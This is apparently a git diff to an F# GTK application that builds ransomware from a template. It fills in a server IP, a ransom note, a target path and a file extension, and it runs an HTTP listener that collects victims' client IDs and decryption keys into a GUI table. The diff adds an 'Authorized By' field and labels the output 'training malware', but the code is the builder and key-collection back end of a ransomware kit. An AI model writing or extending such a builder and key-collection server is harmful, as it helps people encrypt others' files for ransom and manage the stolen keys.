@@ -7,16 +7,17 @@ open Gtk
 let mutable serverRunning = false
 let mutable listener : HttpListener option = None
 
-// Define a mutable list to store client IDs and keys
+// Define a mutable list to store authorized by, client IDs, and keys
 let mutable clientKeys = []
 
 // Function to update the client list in the GUI
 let updateClientList (listStore: ListStore) =
     printfn "Updating client list in the GUI..."
     listStore.Clear() // Clear existing entries
-    for (clientId, key) in clientKeys do
-        // Append client ID and key to the list store
-        listStore.AppendValues([| clientId :> obj; key :> obj |]) |> ignore
+    for (authorizedBy, clientId, key) in clientKeys do
+        printfn "Adding to list view: AuthorizedBy = %s, ClientID = %s, Key = %s" authorizedBy clientId key
+        // Append authorized by, client ID, and key to the list store
+        listStore.AppendValues([| authorizedBy :> obj; clientId :> obj; key :> obj |]) |> ignore
     printfn "Client list update complete."
 
 // Function to start the HTTP listener
@@ -38,18 +39,20 @@ let startHttpListener (port: int) (listStore: ListStore) =
                     let request = context.Request
                     use reader = new StreamReader(request.InputStream)
                     let data = reader.ReadToEnd()
+                    printfn "Received data: %s" data
 
-                    // Parse the client ID and decryption key from the request (e.g., ID=123, Key=ABC)
+                    // Parse the authorized by, client ID, and decryption key from the request (e.g., AuthorizedBy=John,ID=123,Key=ABC)
                     let parts = data.Split(',')
-                    if parts.Length = 2 then
-                        let clientId = parts.[0].Split('=')[1]
-                        let key = parts.[1].Split('=')[1]
+                    if parts.Length = 3 then
+                        let authorizedBy = parts.[0].Split('=')[1]
+                        let clientId = parts.[1].Split('=')[1]
+                        let key = parts.[2].Split('=')[1]
 
-                        // Add client ID and key to the mutable list
-                        clientKeys <- (clientId, key) :: clientKeys
+                        // Add authorized by, client ID, and key to the mutable list
+                        clientKeys <- (authorizedBy, clientId, key) :: clientKeys
 
                         // Print to terminal
-                        printfn "Received: Client ID = %s, Key = %s" clientId key
+                        printfn "Received: Authorized by = %s, Client ID = %s, Key = %s" authorizedBy clientId key
 
                         // Ensure that the update happens on the main GTK thread
                         GLib.Idle.Add(fun () -> 
@@ -81,12 +84,7 @@ let stopHttpListener () =
         printfn "No listener to stop"
 
 // Function to modify the ransomware script
-let modifyRansomwareScript (templatePath: string) (outputPath: string) serverIp noteFile message pathToEncrypt excludeExtensions customExtension =
-    // Ensure the directory exists
-    let directory = Path.GetDirectoryName(outputPath)
-    if not (Directory.Exists(directory)) then
-        Directory.CreateDirectory(directory) |> ignore
-
+let modifyRansomwareScript templatePath outputPath serverIp noteFile message pathToEncrypt excludeExtensions customExtension authorizedBy =
     let scriptContent = File.ReadAllText(templatePath)
     let modifiedScript =
         scriptContent
@@ -96,6 +94,7 @@ let modifyRansomwareScript (templatePath: string) (outputPath: string) serverIp 
             .Replace("[PATH_TO_ENCRYPT]", pathToEncrypt)
             .Replace("[EXCLUDE_EXTENSIONS]", excludeExtensions)
             .Replace("[CUSTOM_EXTENSION]", customExtension)
+            .Replace("[AUTHORIZED_BY]", authorizedBy)  // Add authorized by to the note
     File.WriteAllText(outputPath, modifiedScript)
     printfn "Modified ransomware script saved to %s" outputPath
 
@@ -112,22 +111,23 @@ let main argv =
     // Create a vertical box to contain all widgets
     let vbox = new VBox()
 
-    // Create a list store to hold client ID and key pairs
-    let listStore = new ListStore(typeof<string>, typeof<string>)
+    // Create a list store to hold authorized by, client ID, and key pairs
+    let listStore = new ListStore(typeof<string>, typeof<string>, typeof<string>)
 
-    // Create a tree view to display client IDs and keys
+    // Create a tree view to display authorized by, client IDs, and keys
     let treeView = new TreeView(listStore)
-    treeView.Selection.Mode <- SelectionMode.Single
 
-    // Add a column for Client ID
-    let clientIdColumn = new TreeViewColumn("Client ID", new CellRendererText(), "text", 0)
+    // Add column headers for the TreeView (Authorized By, Client ID, Key)
+    let authorizedByColumn = new TreeViewColumn("Authorized By", new CellRendererText(), "text", 0)
+    let clientIdColumn = new TreeViewColumn("Client ID", new CellRendererText(), "text", 1)
+    let keyColumn = new TreeViewColumn("Decryption Key", new CellRendererText(), "text", 2)
+
+    // Add the columns to the TreeView
+    treeView.AppendColumn(authorizedByColumn)
     treeView.AppendColumn(clientIdColumn)
-
-    // Add a column for Decryption Key
-    let keyColumn = new TreeViewColumn("Decryption Key", new CellRendererText(), "text", 1)
     treeView.AppendColumn(keyColumn)
 
-    // Add the tree view to the window
+    // Add the TreeView to the window
     vbox.PackStart(treeView, true, true, 0u)
 
     // Create a button to start/stop the server
@@ -149,25 +149,24 @@ let main argv =
     )
     vbox.PackStart(serverButton, false, false, 10u)
 
-    // Add the "Delete Selected" button
+    // Create a "Delete Selected" button
     let deleteButton = new Button("Delete Selected")
     deleteButton.Clicked.Add(fun _ ->
         let selection = treeView.Selection
         let success, iter = selection.GetSelected()
         if success then
-            let clientId = listStore.GetValue(iter, 0) :?> string // Cast to string
-            let key = listStore.GetValue(iter, 1) :?> string // Cast to string
-            printfn "Deleting: Client ID = %s, Key = %s" clientId key
+            let clientId = listStore.GetValue(iter, 1) :?> string // Cast to string (column 1 = Client ID)
+            printfn "Deleting: Client ID = %s" clientId
 
             // Remove the selected client ID and key from the list
-            clientKeys <- clientKeys |> List.filter (fun (id, _) -> id <> clientId)
+            clientKeys <- clientKeys |> List.filter (fun (_, id, _) -> id <> clientId)
             updateClientList(listStore) // Refresh the list after deletion
         else
             printfn "No row selected"
     )
     vbox.PackStart(deleteButton, false, false, 10u)
 
-    // Add the "Generate Training Malware" button
+    // Create the "Generate Training Malware" button
     let generateButton = new Button("Generate Training Malware")
     generateButton.Clicked.Add(fun _ ->
         // Create a dialog to collect malware options
@@ -181,6 +180,7 @@ let main argv =
         let pathToEncryptEntry = new Entry() // Path to encrypt
         let excludeExtensionsEntry = new Entry() // Exclude extensions
         let customExtensionEntry = new Entry() // Custom extension
+        let authorizedByEntry = new Entry() // Authorized By
 
         // Add a confirmation button to the dialog
         dialog.AddButton("Generate", ResponseType.Accept) |> ignore
@@ -198,6 +198,8 @@ let main argv =
         dialog.ContentArea.PackStart(excludeExtensionsEntry, false, false, 0u)
         dialog.ContentArea.PackStart(new Label("Custom Extension:"), false, false, 0u)
         dialog.ContentArea.PackStart(customExtensionEntry, false, false, 0u)
+        dialog.ContentArea.PackStart(new Label("Authorized By:"), false, false, 0u)
+        dialog.ContentArea.PackStart(authorizedByEntry, false, false, 0u)
         dialog.ShowAll()
 
         let response = dialog.Run()
@@ -208,11 +210,12 @@ let main argv =
             let pathToEncrypt = pathToEncryptEntry.Text
             let excludeExtensions = excludeExtensionsEntry.Text
             let customExtension = customExtensionEntry.Text
+            let authorizedBy = authorizedByEntry.Text
 
             let templatePath = "./Templates/template_ransomware.fsx"
             let outputPath = "./Generated/malware_simulation.fsx"
 
-            modifyRansomwareScript templatePath outputPath serverIp noteFile message pathToEncrypt excludeExtensions customExtension
+            modifyRansomwareScript templatePath outputPath serverIp noteFile message pathToEncrypt excludeExtensions customExtension authorizedBy
         dialog.Destroy()
     )
     vbox.PackStart(generateButton, false, false, 10u)
